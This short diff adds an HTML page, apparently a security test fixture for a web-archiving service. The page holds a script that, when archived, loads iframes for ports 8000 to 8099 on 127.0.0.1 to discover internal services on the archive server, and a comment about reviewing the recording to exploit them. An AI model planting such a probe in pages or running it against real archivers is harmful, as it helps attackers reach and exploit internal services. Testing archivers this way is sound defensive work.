@@ -1,0 +1,20 @@
+<html>
+<body>
+  <p>When archived, the script tag in this page should discover what ports are hosting locally reachable services on the archive server.</p>
+  <script>
+    for (i = 8000; i < 8100; i++) {
+      // write label
+      var p = document.createElement('p');
+      p.innerText = i.toString();
+      document.body.appendChild(p);
+
+      // write iframe
+      var iframe = document.createElement('iframe');
+      iframe.src = "http://127.0.0.1:" + i;
+      document.body.appendChild(iframe);
+    }
+
+    // ... then review recording manually to find unusual responses and exploit ...
+  </script>
+</body>
+</html>
